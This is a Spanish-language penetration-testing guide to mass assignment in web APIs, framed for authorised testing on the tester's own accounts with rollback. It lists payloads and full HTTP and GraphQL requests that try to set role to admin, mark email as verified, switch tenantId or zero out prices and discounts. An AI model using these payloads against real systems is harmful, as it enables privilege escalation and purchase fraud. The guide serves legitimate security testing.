# 🗡️ Mass assignment en APIs: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

## 📚 Banco ampliado de payloads

[Abrir el catálogo por técnica y los diccionarios de PayloadsAllTheThings](Catalogo_PATT.md). Los bloques de esta guía explican las pruebas iniciales; el catálogo reúne variantes adicionales por motor, parser y contexto.

> **Lectura del banco:** cuando un bloque enumera varias URL, rutas, cabeceras o cuerpos, cada línea suele ser una alternativa. Elegir la variante que corresponde al motor, parser y flujo real.

## 💉 Payloads básicos

### Propiedades reservadas junto a un campo permitido

```text
{"displayName":"canary-{NONCE}","role":"admin"}
{"displayName":"canary-{NONCE}","emailVerified":true}
{"displayName":"canary-{NONCE}","tenantId":"{TENANT_B_PROPIO}"}
```

**Cuándo usarlo:** Cada línea es una solicitud alternativa sobre cuenta propia; confirmar estado con GET aparte.

**Fuente:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa3-broken-object-property-level-authorization/).


### Campos de negocio calculados

```text
{"itemId":"{ITEM_PROPIO}","quantity":1,"unitPrice":0}
{"itemId":"{ITEM_PROPIO}","quantity":1,"totalPrice":0}
{"cartId":"{CARRITO_PROPIO}","discountPercent":100}
```

**Cuándo usarlo:** No completar compras reales; probar que el servidor recalcula y no vincula propiedades reservadas.

**Fuente:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Mass%20Assignment).


## 🧭 Payloads por contexto

### JSON anidado y formulario

```text
{"profile":{"nickname":"canary-{NONCE}","account":{"role":"admin"}}}
displayName=canary-{NONCE}&role=admin
PATCH /api/v1/me?role=admin  body={"displayName":"canary-{NONCE}"}
```

**Cuándo usarlo:** La vinculación puede cambiar según Content-Type y profundidad; adaptar solo a formatos admitidos.

**Fuente:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Mass%20Assignment).


## 🔥 Payloads avanzados

### Merge Patch e input GraphQL

```text
PATCH /api/v1/me  Content-Type: application/merge-patch+json  body={"role":"admin"}
mutation { updateProfile(input:{displayName:"canary-{NONCE}",role:"admin"}) { id role } }
```

**Cuándo usarlo:** Son dos patrones abreviados y alternativos; el segundo requiere que el esquema acepte role en el input. Verificar la propiedad persistida y restaurar cambios de laboratorio.

**Fuente:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa3-broken-object-property-level-authorization/).


## 🔬 Pruebas guiadas por escenario

### 1. Propiedad de rol no editable

**Objetivo:** Comprobar rechazo de una propiedad privilegiada al editar la cuenta propia.

```json
{"displayName":"canary-{NONCE}","role":"admin"}
```

**Interpretación:** El backend debe ignorar/rechazar role. Confirmar con GET separado, no solo respuesta reflejada.

**Fuente técnica:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa3-broken-object-property-level-authorization/).

### 2. Propiedad de verificación

**Objetivo:** Verificar que emailVerified no se toma del cliente.

```json
{"displayName":"canary-{NONCE}","emailVerified":true}
```

**Interpretación:** Usar cuenta propia no verificada y restaurar estado; el cambio real importa, no un eco del body.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Mass%20Assignment/README.md).

### 3. Objeto anidado

**Objetivo:** Probar que la lista de campos permitidos se aplica también a objetos anidados.

```json
{"profile":{"nickname":"canary-{NONCE}","account":{"role":"admin"}}}
```

**Interpretación:** Adaptar al modelo aceptado; un 400 por esquema desconocido no demuestra protección general.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Mass%20Assignment/README.md).

### 4. Identificador de tenant

**Objetivo:** Comprobar que tenantId se deriva de identidad autenticada.

```json
{"displayName":"canary-{NONCE}","tenantId":"{TENANT_B_CONTROLADO}"}
```

**Interpretación:** Probar con dos tenants propios y verificar estado efectivo; no mover objetos ajenos.

**Fuente técnica:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa3-broken-object-property-level-authorization/).

### 5. PATCH frente a PUT

**Objetivo:** Comparar lista de propiedades mutables en dos métodos soportados.

```text
PATCH /api/v1/me  {"displayName":"canary-{NONCE}","role":"admin"}
PUT /api/v1/me    {"displayName":"canary-{NONCE}","role":"admin"}
```

**Interpretación:** Solo en objeto propio y con reversión; algunas APIs no implementan PUT.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Mass%20Assignment/README.md).

### 6. Propiedad en query

**Objetivo:** Verificar si el backend mezcla query y cuerpo antes de actualizar.

```http
PATCH /api/v1/me?role=admin HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
Content-Type: application/json

{"displayName":"canary-{NONCE}"}
```

**Interpretación:** Comparar con petición sin query; verificar rol real tras la actualización.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Mass%20Assignment/README.md).

### 7. GraphQL input

**Objetivo:** Comprobar que el resolver no acepta campos internos en input flexible.

```graphql
mutation { updateProfile(input:{displayName:"canary-{NONCE}",role:"admin"}) { id role } }
```

**Interpretación:** Si role no está en el esquema, el rechazo es esperado; si existe, comprobar control de autorización.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/graphql).

### 8. Propiedad de precio

**Objetivo:** Verificar que campos calculados por servidor no los fija el cliente.

```json
{"itemId":"{ITEM_PROPIO}","quantity":1,"totalPrice":0}
```

**Interpretación:** Usar cesta/ítem de prueba y no completar una compra real; confirmar importe en backend.

**Fuente técnica:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa3-broken-object-property-level-authorization/).

### 9. Formulario URL encoded

**Objetivo:** Comprobar lista de campos permitidos fuera de JSON.

```http
PATCH /api/v1/me HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
Content-Type: application/x-www-form-urlencoded

displayName=canary-{NONCE}&role=admin
```

**Interpretación:** Solo si ese Content-Type está soportado. Verificar rol persistido con lectura independiente.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Mass%20Assignment/README.md).

### 10. JSON Merge Patch

**Objetivo:** Comprobar que application/merge-patch+json no cambia propiedades reservadas.

```http
PATCH /api/v1/me HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
Content-Type: application/merge-patch+json

{"role":"admin"}
```

**Interpretación:** La variante requiere soporte real del media type. Confirmar rechazo y rol persistido de la cuenta propia.

**Fuente técnica:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa3-broken-object-property-level-authorization/).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
